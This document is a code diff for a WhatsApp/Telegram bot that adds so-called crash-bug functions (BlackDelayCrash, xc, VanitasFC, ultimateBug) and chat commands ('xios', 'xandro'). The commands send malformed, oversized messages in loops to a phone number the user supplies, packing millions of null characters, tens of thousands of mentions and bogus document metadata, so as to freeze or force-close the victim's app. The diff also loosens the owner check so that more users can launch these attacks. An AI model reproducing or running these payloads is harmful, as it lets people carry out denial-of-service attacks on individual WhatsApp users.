@@ -1,4 +1,4 @@
-const { makeWASocket, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason, generateWAMessageFromContent } = require("@fizzxydev/baileys-pro");
+const { makeWASocket, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason, generateWAMessageFromContent, relayMessage } = require("@fizzxydev/baileys-pro");
 const TelegramBot = require('node-telegram-bot-api');
 const NodeCache = require('node-cache');
 const pino = require('pino');
@@ -232,6 +232,246 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
         const isBotAdmin = groupAdmins.includes(botNumber);
 
         // Helper functions
+ async function BlackDelayCrash(target, mention) {
+  let msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32)
+        },
+        interactiveResponseMessage: {
+          body: {
+            text: "VIPER BUG",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "Viper Bug Bot",
+            paramsJson: "\u0000".repeat(999999),
+            version: 3
+          },
+          contextInfo: {
+            isForwarded: true,
+            forwardingScore: 9741,
+            forwardedNewsletterMessageInfo: {
+              newsletterName: "( @ayokunledavid )",
+              newsletterJid: "120363321780343299@newsletter",
+              serverMessageId: 1
+            }
+          }
+        }
+      }
+    }
+  }, {});
+
+  await conn.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: target }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+
+  if (mention) {
+    await conn.relayMessage(target, {
+      statusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg.key,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            type: 25
+          },
+          additionalNodes: [
+            {
+              tag: "meta",
+              attrs: { is_status_mention: "VIPER X BUG" },
+              content: undefined
+            }
+          ]
+        }
+      }
+    }, {});
+  }
+  console.log("Black Owl Success Sending Delay Crash Bug");
+}
+async function xc(target) {
+   
+  await conn.relayMessage(target, {
+    contactMessage: {
+      displayName: "~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~" + "𑇂𑆵𑆴𑆿".repeat(60000),
+      vcard:` BEGIN:VCARD
+      VERSION:3.0
+      N:~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~
+      FN:~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~
+      item1.TEL;waid=+5521992999999:5521992999999
+      item4.ADR:;;Brasil, AM, SP;;;;
+      X-WA-BIZ-DESCRIPTION: JohnleoSm1th Mp4
+      X-WA-BIZ-NAME: KING SAM Mp5      
+      END:VCARD`,
+      contextInfo: {
+        forwardingScore: 2,
+        isForwarded: true,
+        isFromMe: true,
+        externalAdReply: {
+        title: "@ You have been mentioned",
+        body: "@ You have been mentioned",
+        mediaType: "VIDEO",
+        renderLargerThumbnail: true,
+        previewTtpe: "VIDEO",
+        thumbnail: pic,
+        sourceType: " x ",
+        sourceId: " x ",
+        sourceUrl: "https://youtube.com/@JohnleoSm1th?si=LoOB7Mbumd1uXSzL",
+        mediaUrl: "https://youtube.com/@JohnleoSm1th?si=LoOB7Mbumd1uXSzL",
+        containsAutoReply: true,
+        renderLargerThumbnail: true,
+        showAdAttribution: true,
+        ctwaClid: "ctwa_clid_example",
+        ref: "ref_example"
+        },       
+        quotedMessage: {
+            message: {
+                text: "AyoKunle",
+                footer: "XxX",
+                buttons: [{
+                    buttonId: "🚀", 
+                    buttonText: {
+                        displayText: '\u0000'.repeat(50000)
+                    },
+                    type: 1 
+                }],
+                headerType: 1,
+                viewOnce: false
+          }
+        }
+      }
+    }
+  }, {
+    participant: { jid: target }
+  });
+}
+async function VanitasFC(target) {
+  try {
+    let message = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "AyoKunle",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude: -6666666666,
+                degreesLongitude: 6666666666,
+                name: "𝖵𝗂𝗉𝖾𝗋 𝖡𝗎𝗀",
+                address: "𝖦𝖺𝖻𝗂𝗆𝖺𝗋𝗎",
+              },
+            },
+            body: {
+              text: "𝖵𝗂𝗉𝖾𝗋 𝖷 𝖡𝗎𝗀",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  {
+                    length: 30000,
+                  },
+                  () =>
+                    "1" +
+                    Math.floor(Math.random() * 5000000) +
+                    "@s.whatsapp.net"
+                ),
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await conn.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target,
+    });
+  } catch (err) {
+    console.log(err);
+  }
+}
+   async function ultimateBug(target, ptcp = true) {
+    let mentions = Array(5000).fill("6283871656842@s.whatsapp.net");
+
+    let messagePayload = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: "🔥 VIPER WA CRASH 🔥",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "⚠️ WARNING: LAG INCOMING ⚠️\n" + "𓆩𓆪".repeat(50000),
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: "{}",
+                        buttons: [
+                            {
+                                name: "cta_url",
+                                buttonParamsJson: "{\"url\":\"https://t.me/ayokunledavid\"}"
+                            },
+                            {
+                                name: "call_permission_request",
+                                buttonParamsJson: "{\"request\":\"permission\"}"
+                            }
+                        ]
+                    }
+                },
+                documentMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
+                    mimetype: "application/pdf",
+                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                    fileLength: "9999999999999",
+                    pageCount: 999999,
+                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                    fileName: "💀 VIPER WA CRASH 💀",
+                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
+                    mediaKeyTimestamp: "1735456100",
+                    contactVcard: true,
+                    caption: "📌 *WA STRESS TEST* 📌"
+                },
+                extendedTextMessage: {
+                    text: "🚀 SYSTEM OVERLOAD 🚀\n" + mentions.join(" "),
+                    contextInfo: {
+                        mentionedJid: mentions
+                    }
+                }
+            }
+        }
+    };
+
+    await conn.relayMessage(target, messagePayload, {
+        participant: { jid: target }
+    });
+
+    console.log("Ultimate crash message sent. WhatsApp might force close.");
+}
         async function xiosinv(bad, target) {
             tmsg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
@@ -361,13 +601,47 @@ https://chat.whatsapp.com/${response}`;
                 }
 
                 case "xios": {
-                    if (!isCreator) return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    if (!botNumber) {
+                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    } else {
                     if (!q) return send("Usage: `xios 234xxx`");
                     const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-                    for (let i = 0; i < 5; i++) {
+                    for (let i = 0; i < 5; i++) {   
+                        await xc(target);
+                        await xc(target);
+                        await xc(target);
                         await xiosinv(conn, target);
+                        await xc(target);
+                        await xc(target);
                     }
-                    send(`${target}: User Disarmed ❌`);
+                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
+                    𝗍ᥲrgᥱ𝗍: ${target}.
+                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been neutralized.
+                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
+                    }
+                    break;
+                }
+                case "xandro": {
+                    if (!botNumber && !isCreator) {
+                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
+                    } else {
+                    if (!q) return send("Usage: `xandro 234xxx`");
+                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+                    try {
+                    for (let i = 0; i < 10; i++) {
+                        await VanitasFC(target);
+                        await VanitasFC(target);
+                        await VanitasFC(target);
+                        await VanitasFC(target);
+                    }
+                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
+                    𝗍ᥲrgᥱ𝗍: ${target}.
+                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been neutralized.
+                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
+                    } catch (err) {
+                    send(`An Error Occurred: ${err}`);
+                    }
+                    }
                     break;
                 }
 
@@ -385,6 +659,7 @@ https://chat.whatsapp.com/${response}`;
 .𝗆𝖾𝗇𝗎
 .𝖽𝖾𝗌𝖼 [𝗇𝖾𝗐]
 .𝗌𝗎𝖻𝗃𝖾𝖼𝗍 [𝗇𝖾𝗐]
+.𝗀𝗋𝗈𝗎𝗉𝗅𝗂𝗇𝗄
 .𝗄𝗂𝖼𝗄 @user
 .𝖼𝗋𝖾𝖺𝗍𝖾𝗀𝖼
 
@@ -392,6 +667,7 @@ https://chat.whatsapp.com/${response}`;
 .𝗌𝖾𝗅𝖿
 .𝗉𝗎𝖻𝗅𝗂𝖼
 .𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
+.𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
 `
@@ -448,6 +724,7 @@ https://chat.whatsapp.com/${response}`;
 
     } catch (err) {
         console.error(chalk.redBright('❌ Error in messages.upsert:'), err);
+        conn.sendMessage(chat, `Error Occured: ${err}`);
     }
 });
 }
@@ -590,19 +867,21 @@ Creator -> ayokunledavid.t.me`;
 
 bot.onText(/\/list/, (msg) => {
     const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const connectedUser  = connectedUsers[chatId];
-    if (connectedUser  && connectedUser .length > 0) {
+    const connectedUser = connectedUsers[chatId];
+
+    if (connectedUser && connectedUser.length > 0) {
         let statusText = `Bot Status:\n- Connected Numbers:\n`;
-        connectedUser .forEach(user => {
-            const uptime = Math.floor((Date.now() - user.connectedAt) / 1000); // Runtime in seconds
-            statusText += `${user.phoneNumber} (Uptime: ${uptime} seconds)\n`;
+
+        connectedUser.forEach(user => {
+            const jid = `${user.phoneNumber}@s.whatsapp.net`;
+            statusText += `${jid}\n`;
         });
+
         bot.sendMessage(chatId, statusText);
     } else {
         bot.sendMessage(chatId, `You have no registered numbers.`);
     }
-}); 
+});
 
 // Function to load all session files
 async function loadAllSessions() {
